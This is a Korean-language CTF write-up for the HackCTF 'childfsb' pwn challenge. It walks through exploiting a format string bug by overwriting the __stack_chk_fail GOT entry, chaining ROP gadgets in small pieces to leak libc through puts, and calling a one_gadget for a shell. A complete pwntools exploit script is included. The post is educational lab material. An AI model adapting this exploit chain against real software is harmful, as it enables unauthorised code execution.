---
layout: post
title:  "HacCTF childfsb write-up"
date:   2020-03-23 19:45:55
image:  hackctf_childfsb.PNG
tags:   [Hackctf]
categories: [Write-up]
---

# [HackCTF] childfsb

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled.png)

PIE 빼고 다 걸려있다.



**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%201.png)

hello 문자열이 출력되고 입력을 받는다.  그 뒤 입력한 내용을 출력해주고 종료하게 된다.



**3) 코드흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%202.png)

puts()로 hello를 출력한다. 그다음 0x19사이즈 만큼 buf에다가 입력을 받고, printf로 출력을 해주는데 서식문자가 없으므로 fsb가  가능하다.





### 2. 접근방법

---

canary가 걸려있으므로 babyfsb와 동일한 방법을 적용시키면 된다. stack_chk_fail 함수의 got를 덮어서 쉘을 따는 것을 목적으로 하자.

이 문제가 babyfsb와 다른점은 read에서 입력을 0x19밖에 못한다는 소리이다. 따라서 필요한 가젯을 한번에 넣어주지 못하기 때문에, 쪼개서 넣어주고, 그다음 메인으로 다시 돌아가는 방식을 이용해야 한다.

우선 leak을 해야한다. babyfsb에서 사용한 페이로드 형식을 참조해보자.

- **babyfsb payload**

    payload = %(pop pop pop pop ; ret; 주소 10진수값)c %8 $ln +"AA" 

    payload += stack_chk_fail_got 주소

    payload += pop rdi; ret 주소

    payload += puts_got 주소

    payload += puts_plt 주소

    payload += "B"*( 0x40 * len(payload) )  // 카나리 변조에러를 일으키기 위해

    payload += main 주소

stack_chk_fail_got를 변조하여 ppppr로 가게끔한다. 그다음 pop을4번하게 되면 "pop rdi;ret"를 가리키는 주소로 ret하고 put_gos를 인자로하여 puts_plt를 호출하여 leak을 하는 방식이다.

위 코드는 한번에 삽입할 수 있지만 우리는 0x19사이즈만 입력 가능하므로 위 방식을 쪼개야 한다.

결국 위 babyfsb payload도 스택에 원하는 값을 넣고 적적한 pop,ret 같은 가젯을 이용해서 원하는 동작이 실행되게 하는 것이다.

따라서 우리는 

    1.
    payload1 = %(pop pop pop pop ; ret; 주소 10진수값)c %8 $ln +"AA" 
    payload1 += stack_chk_fail_got 주소
    ----------------------------------------------------------
    2.
    payload2 += pop rdi; ret 주소
    payload2 += puts_got 주소
    payload2 += puts_plt 주소
    ----------------------------------------------------------
    3.
    payload3 += "B"*( 0x40 * len(payload) )  // 카나리 변조에러를 일으키기 위해
    payload3 += main 주소

이런식으로 3번에 걸쳐서 해당 값을 스택에 넣어주면 된다. 물론 위의 페이로드 그대로 쪼개서 넣는 것은 안되고, 저런식으로 쪼개서 넣는다는 것이다. 

1. 3번 페이로드를 read로 buf(스택)에 넣고 main으로 돌아오기
2. 2번 페이로드를 read로 buf(스택)에 넣고 main으로 돌아오기
3. 1번 페이로드를 read로 buf(스택)에 넣고 main으로 돌아오기

이렇게 진행한다면 babyfsb 페이로드와 동일(?) 한 동작을 하는 페이로드를 쪼개서 삽입할 수 있다.

다시한번 말하지만 해당 페이로드를 단순히 쪼개면 안되고 이제 childfsb 문제에 맞게 쪼개서 넣어야 한다.




- **시나리오**
    1. **stack_chk_fail_got를 main으로 돌아가게 한다. 단  push rbp이 아닌  mov rbp,rsp로 돌아가게 한다. 그래야 stack_chk_fail_got를 main으로 덮어도, 스택이 유지된다.**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%203.png)

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%204.png)

        - main에서 read를 통해 $rbp-0x20에 값이 들어가고, printf가 호출되면 0x601020값이 mov rbp,rsp로 덮힌다. 즉 1번 동작은 스택을 유지시키기 위함이다
        - 0x7ffd6c791a00 ~ 0x7ffd6c791a08  : "%4196192c%8$ln"+"AA"
        - 0x7ffd6c791a10 ~ 0x7ffd6c791a18  : 0x601020(stak_chk_fail_got) + A



    2. **1번으로 스택을 유지시킬수 있으므로 이제부터 제대로 시작된다. 우선, puts_plt와 main 주소를 스택에 삽입해야 한다.**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%205.png)

        puts_plt와 main(0x40075f)를 입력하고 나머지를 "A" 채워서 입력한다. 이는 put_plt를 호출하여 libc 주소 leak을 하고 다시 메인으로 돌아오기 위한 방법이다.

         1번을 통하여 스택이 유지되므로 0x400760으로 돌아가도 스택에 값이 계속 쌓인다.

        - 빨간색이 1번에서 입력한 값이고, 노란색이 방금 입력한 값이다



    3. **puts_plt의 인자를 세팅하기 위한 값을 삽입해야 한다.(pop rdi;ret; + puts_got)**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%206.png)

        - 파란색 : pop rdi;ret; + puts_got + ppr
        - 노란색 : 2번에서 입력한 값
        - 빨간색 : 1번에서 입력한 값

        3번째 입력에서 pop rdi;ret; 와 puts_got를 입력했다. 우리가 원하는 동작은 puts_got를 pop하여 rdi에 저장하고 puts_plt를 호출하는 것이다. 하지만 현재 노란색의 puts_plt 부분은 파란색 부분과 떨어져 있으므로 ppr 가젯을 추가적으로 넣어주었다.(0x400831)

        따라서 pop rdi 를 통해 0x601018이 rdi에 들어가고 0x400831로 ret를 한다. 그리고 두번의 pop이 진행되어 0x4005b0이 ret로 들어가게된다.



    4. **그럼이제 leak을 위한 인자세팅을 끝났다. fsb로 stack_chk_fail_got를 3번의 pop rid;ret가 들어있는 주소로 덮어야 한다.**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%207.png)

        - 초록색 : ppppppr + AA + stack_chk_fail_got

        나머지는 위와 동일하다. 여기서 왜 ppppppr을 줬냐면, 우리가 ret시켜야할 위치는 0x400833이 들어있는 위치이다. 따라서 총 6번의 pop을 진행해야하기 때문에 해당 가젯을 fsb로 stack_chk_fail_got에 overwrite를 하였다.



    5. **4번이 정상적으로 진행된면, puts의 libc 주소가 leak된다. 이를 이용하여 one_gadget으로 쉘을 획득하면 된다.**
        - 우선 4번을 통해 puts_plt가 호출되면 아까 2번에서 입력한 main으로 돌아갈것이다. 따라서 다시 스택을 재사용하기 위해 1번 과정을 한번더 진행한다.



    6. **다시 스택을 재사용할 수 있게 됬으므로 read를 통해 one_gadet 주소를 입력하고 적절한 가젯을 이용하여 fsb를 구성해주자**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%208.png)

        일단 read를 통해 one_gadget이 잘 들어가있는 것을 확인할 수 있다. 이제 다시 stack_chk_fail이 호출되면서  mov rbp,rsp로 돌아갈것이다



    7. **fsb 삽입**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%209.png)

        fsb를 삽입하면 다음과 같이 된다. 우리가 ret시킬 주소는 빨간색 값이 담긴 주소이므로 pop 6개 가젯을 fsb로 구성해줘야지 0x601020의 값이 overwrite가 되면서 빨간색 부분으로 ret될 것이다.

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childfsb/Untitled%2010.png)

        pop이 6개 진행되고 one_gadet이 정상적으로 호출될 것이다





### 3. 풀이

---

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level="DEBUG"
    #p=remote("ctf.j0n9hyun.xyz",3037)
    p=process("./childfsb",aslr="False")
    e=ELF("./childfsb")
    gdb.attach(p,'code\nb *0x7a7+$code\n')
    
    libc=ELF("./libc.so.6")
    ppppppr=0x40082A
    pppr=0x40082c
    ppr=0x400831
    pr=0x400833
    stack_chk_got=e.got['__stack_chk_fail']
    puts_got=e.got['puts']
    puts_plt=e.plt['puts']
    main=0x40075F
    main_2=0x400760
    
    payload = "%4196192c%8$ln"+"AA"
    payload += p64(stack_chk_got)
    payload += "A"*(0x19-len(payload))
    p.recvuntil("hello\n")
    pause()
    p.send(payload)
    
    
    payload2 = p64(0x4005b0)
    payload2 += p64(main)
    payload2 += "A"*(0x19-len(payload2))
    pause()
    p.sendafter("hello\n",payload2)
    
    payload3 = p64(pr)
    payload3 += p64(puts_got)
    payload3 += p64(ppr)
    payload3 += "A"*(0x19-len(payload3))
    #pause()
    p.sendafter("hello\n",payload3)
    
    
    payload4 = "%4196394c%8$ln"+"AA"
    payload4 += p64(stack_chk_got)
    payload4 += "A"*(0x19-len(payload4))
    p.sendafter("hello\n",payload4)
    
    puts_libc=u64(p.recvuntil('hello')[-12:-6]+"\x00\x00")
    libc_base=puts_libc-libc.symbols['puts']
    log.info(hex(libc_base))
    
    payload44 = "%4196192c%8$ln"+"AA"
    payload44 += p64(stack_chk_got)
    payload44 += "A"*(0x19-len(payload44))
    p.send(payload44)
    
    one_gadget=libc_base+0x45216
    payload5 = p64(one_gadget)
    payload5 += "A"*(0x19-len(payload5))
    pause()
    p.send(payload5)
    
    
    payload6 = "%4196394c%8$ln"+"AA"
    payload6 += p64(stack_chk_got)
    payload6 += "A"*(0x19-len(payload6))
    pause()
    p.send(payload6)
    
    
    p.interactive()





### 4. 몰랐던 개념

---

문제를 해결하기 위해 알아야하는 새로운 지식을 없었지만, 스택을 재사용하기 위해 프롤로그 중반으로 ret시키는 방법이 참신했던 문제이다.

비록 롸업을 보면서 해결하긴 했지만, 다 이해하면서 진행했기때문에 나름 보람찼다.